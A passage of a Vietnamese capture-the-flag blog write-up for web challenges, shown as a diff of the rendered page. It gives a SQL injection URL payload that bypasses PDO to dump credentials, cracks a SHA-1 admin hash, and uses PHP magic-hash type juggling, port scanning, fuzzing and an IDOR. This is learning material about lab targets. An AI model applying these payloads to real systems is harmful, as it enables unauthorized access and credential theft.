+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Exploit failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><strong>FLAG: MSEC{Y0U_ARE_A_RE_G0D_!!}</strong></p>
+<h2 id="blackd00r">BlackD00r<a hidden class="anchor" aria-hidden="true" href="#blackd00r">#</a></h2>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJKOjug8Zl.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyGPiOxI-g.png"></p>
+<h3 id="phân-tích-2">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích-2">#</a></h3>
+<h4 id="cơ-chế-đăng-nhập-loginphp">Cơ chế đăng nhập (<code>login.php</code>)<a hidden class="anchor" aria-hidden="true" href="#cơ-chế-đăng-nhập-loginphp">#</a></h4>
+<ul>
+<li>Trong file <code>login.php</code> xử lý đăng nhập theo 2 nhánh:
+<ul>
+<li>User thường: sử dụng <code>password_verify</code> (brypt)</li>
+<li>Admin: sử dụng <code>sha1($password) === $user['password']</code><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy1AidgI-g.png">
+=&gt; SHA-1 đã lỗi thời và rất dễ bị crack. Nếu ta có hash của admin thì ta có thể tìm ra password gốc</li>
+</ul>
+</li>
+</ul>
+<h4 id="backdoor-bid_handlerphp">Backdoor: <code>bid_handler.php</code><a hidden class="anchor" aria-hidden="true" href="#backdoor-bid_handlerphp">#</a></h4>
+<ul>
+<li>Trong file <code>bid_handler.php</code> sử dụng extention <code>runkit</code> để tạo hàm <code>ruleCheck</code> động từ db <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1vr2deUWe.png"></li>
+<li>Biến <code>$rule</code> được lấy trực tiếp từ bảng <code>auctions</code> trong db
+=&gt; Nếu ta kiểm soát được nội dung cột <code>rule</code> trong db, ta có thể chèn code PHP =&gt; RCE</li>
+</ul>
+<h4 id="admin-panel">Admin panel<a hidden class="anchor" aria-hidden="true" href="#admin-panel">#</a></h4>
+<ul>
+<li>File <code>admin.php</code> cho phép admin chỉnh sửa <code>rule</code> và <code>message</code> của các phiên đấu giá =&gt; flag được hardcode trong file này <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1HMbKxIWg.png"></li>
+</ul>
+<h3 id="vuln-2">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln-2">#</a></h3>
+<ul>
+<li>
+<p><strong>Lỗ hổng SQL Injection</strong> <code>inventory.php</code>: các tham số <code>user_id</code> và <code>sort</code> được truyền vào các truy vấn SQL mà không được xử lý đúng cách, cho phép thực thi các lệnh SQL tùy ý thông qua việc chèn dấu ngoặc kép ngược <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy7pQteL-g.png"></p>
+</li>
+<li>
+<p><strong>Quá trình xử lý trong admin panel</strong>: dynamic rules system cho các cuộc đấu giá sử dụng <code>runkit_function_add()</code> để tạo động các hàm PHP từ dữ liệu đầu vào của user, mở ra kẽ hở cho RCE</p>
+</li>
+</ul>
+<p><strong>Chain: SQL Injection → trích xuất thông tin đăng nhập → truy cập admin panel → lấy flag</strong></p>
+<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
+<h4 id="sql-injection-để-trích-xuất-thông-tin-đăng-nhập">SQL Injection để trích xuất thông tin đăng nhập<a hidden class="anchor" aria-hidden="true" href="#sql-injection-để-trích-xuất-thông-tin-đăng-nhập">#</a></h4>
+<ul>
+<li><code>inventory.php</code> các tham số user được xử lý một cách đáng nghi. Sau khi phân tích chi tiết hơn ta thấy: các tham số <code>user_id</code> và <code>sort</code> được đưa trực tiếp vào các truy vấn SQL mà không qua bất kỳ bộ lọc nào =&gt; Đây là lỗi tấn công SQL injection kinh điển thông qua việc chèn dấu ngoặc kép ngược (backtick). Để khai thác lỗi này, ta sử dụng payload sau:</li>
+</ul>
+<pre tabindex="0"><code>http: //localhost:8080/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&amp;sort=\?;--+-%00
+</code></pre><ul>
+<li>Key point để bypass PDO
+<ul>
+<li><code>\?</code> : Dấu backslash trước dấu chấm hỏi làm hỏng quá trình phát hiện tham số vì PDO quét <code>?</code> các phần giữ chỗ trước khi phân tích cú pháp MySQL và không nhận ra biến thể được mã hóa
+-<code> %00</code> : bull byte gây ra hiện tượng cắt ngắn chuỗi ở cấp độ C trong trình điều khiển MySQL, dẫn đến việc cắt bỏ phần còn lại của truy vấn
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Bk-RrFlIbx.png"></li>
+</ul>
+</li>
+</ul>
+<h4 id="truy-cập-admin-panel">Truy cập admin panel<a hidden class="anchor" aria-hidden="true" href="#truy-cập-admin-panel">#</a></h4>
+<ul>
+<li>
+<p>Như ta thấy ta đã trích xuất được thông tin của <code>admin</code> kèm pasword đã bị bcrypt (<code>b78034aacf3559fffbfcb545d9a9122efb93181f</code>)</p>
+</li>
+<li>
+<p>Ta tra passwod bcrypt trên thì trả về password là <code>iloveu</code><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1dtUKgIZe.png">
+(<a href="https://gist.github.com/roycewilliams/226886fd01572964e1431ac8afc999ce">https://gist.github.com/roycewilliams/226886fd01572964e1431ac8afc999ce</a>)</p>
+</li>
+<li>
+<p>Login vào <code>admin:iloveu</code><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Bkk68tgLbg.png">
+=&gt; Trả về được flag ở admin panel</p>
+</li>
+</ul>
+<p><strong>Flag: MSEC{PDO_So_danger}</strong></p>
+<h2 id="realhacker">RealHacker<a hidden class="anchor" aria-hidden="true" href="#realhacker">#</a></h2>
+<ul>
+<li>
+<p>chall này khác đặc biệt</p>
+</li>
+<li>
+<p>Khi vào link chall ta thấy xuất hiện là 1 trang login bình thường</p>
+</li>
+<li>
+<p>Khi ta thử nhập username và password bất kỳ rồi nhấn sign up thì sẽ trả về<code>User not found</code></p>
+</li>
+<li>
+<p>Ta sẽ thử nhập các username đặc biệt như <code>admin</code>, <code>administrator</code>,v&hellip;v.. và bất ngờ là khi nhập username=<code>admin</code> và password bất kỳ thì trả về error <code>Invalid credentials</code> =&gt; username=<code>admin</code> có tồn tại và ta phải đi tìm mật khẩu của nó</p>
+</li>
+<li>
+<p>Nhưng việc mò mật khẩu gần như vô vọng</p>
+<ul>
+<li>Ở đây ta sẽ nghĩ đến việc nếu ta cho password là dạng <code>array</code> thì sẽ như thế nào
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkQkEix8Wx.png"></li>
+</ul>
+</li>
+<li>
+<p>Thật bất ngờ là trả về md5 =&gt; server đang hash password đầu vào bằng MD5 rồi mới so sánh</p>
+</li>
+<li>
+<p>Trong php nếu một chuỗi bắt đầu bằng <code>0e</code> theo sau toàn bộ (ví dụ <code>0e123456</code>) PHP sẽ coi nó là ký hiệu khoa học của số 0 ($0 \times 10^{n}$) =&gt; <code>0e123...</code> == <code>0e456...</code> (do <code>0==0</code>)</p>
+</li>
+<li>
+<p>Ta nghĩ hash mật khẩu của admin trong db là một chuỗi bắt đầu bằng <code>0e</code> và toàn số.</p>
+</li>
+<li>
+<p>Bây giờ ta cần nhập một password sao cho <code>md5(password)</code> cũng ra kết quả <code>0e</code>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md">PHP type juggling (magic hash)</a></p>
+</li>
+<li>
+<p>Ta sẽ thử nhập <code>240610708</code></p>
+<ul>
+<li><code>md5(&quot;240610708&quot;) = 0e462097431906509019562988736854</code>
+=&gt; Thật bất ngờ!!! trả về flag part 1 =&gt; suy nghĩ của ta đã đúng
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJyRHieI-e.png"></li>
+</ul>
+</li>
+<li>
+<p>Cũng với suy nghĩ đó ta sẽ thử tìm một username khác nếu trả về <code>Invalid Credentials</code> thì tức là username đó tồn tại trong db</p>
+</li>
+<li>
+<p>Ta thử nghĩ đến việc dùng SQLi như <code>admin'--</code> nhưng đều trả về <code>User not found</code> =&gt; từ đây có thể thấy mọi payload SQLi nhập vào không có tác dụng</p>
+</li>
+<li>
+<p>Tôi đã thử mò các username khác và phát hiện ra username=<code>guest</code> và password=<code>guest123</code> nhưng thật buồn vì nó chỉ là một dịch vụ <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1ypUox8Zl.png"></p>
+</li>
+<li>
+<p>Bất lực khi cố mò username trả về <code>Invalid credentials</code></p>
+</li>
+<li>
+<p>Tôi đã thử nghĩ liệu rằng là challenge này có port khác không, khi phần mô tả của challenge nói <code>Lắp rạp lại thành flag</code></p>
+</li>
+<li>
+<p>Từ đây tôi đã thử dùng nmap để quét xem còn có port nào khác mà tôi không biết
+<code>nmap -p- -T4 -v 160.191.49.168</code></p>
+</li>
+<li>
+<p>THẬT BẬT NGỜ là tồn tại port khác mà tôi không biết, không những thế còn có tận 2 port dịch vụ khác là <code>534</code> và <code>768</code></p>
+</li>
+</ul>
+<h3 id="port-534">port 534<a hidden class="anchor" aria-hidden="true" href="#port-534">#</a></h3>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1s7dsgLbe.png"></p>
+<ul>
+<li>Ta thấy được là ở port này ta có cái endpoint như <code>api/status</code> và <code>api/health</code></li>
+<li>Ta đây ta lại có nghi ngờ rằng là liệu còn có endpoint nào khác không</li>
+<li>Để kiểm chứng tôi đã dùng fuzz để quét endpoint</li>
+<li>Và thực sự nghi ngờ của tôi đã đúng =&gt; tìm ra được endpoint <code>secrets</code></li>
+<li>Truy cập tới endpoint trên thì ta tìm ra được flag part 2 là:
+<code>{&quot;message&quot;:&quot;Congratulations! You found the hidden endpoint.&quot;,&quot;flag_part2&quot;:&quot;haking_is_&quot;}</code></li>
+</ul>
+<h3 id="port-768">port 768<a hidden class="anchor" aria-hidden="true" href="#port-768">#</a></h3>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1e7FieIWl.png"></p>
+<ul>
+<li>
+<p>Ở port này khi ta ấn thử vào các profile ở trang chính thì trên url trả về <code>/profile?id=1</code> (khi nhấn vào profile của John Smith)
+=&gt; Ta nghĩ ngay tới IDOR</p>
+</li>
+<li>
+<p>Ta sẽ thử các ID quen thuộc mang tính mặc định của hệ thống như <code>999</code>, <code>1337</code></p>
+</li>
+<li>
+<p>Bất ngờ là id <code>1337</code> thật sự đã trả về profile của admin kèm flag <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJlp5ieLbg.png"></p>
+</li>
+<li>
+<p>Ghép các phần flag lại ta được flag hoàn chỉnh là: <code>MSEC{Real_haking_is_this}</code></p>
+</li>
+</ul>
+<p><strong>FLAG: MSEC{Real_haking_is_this}</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
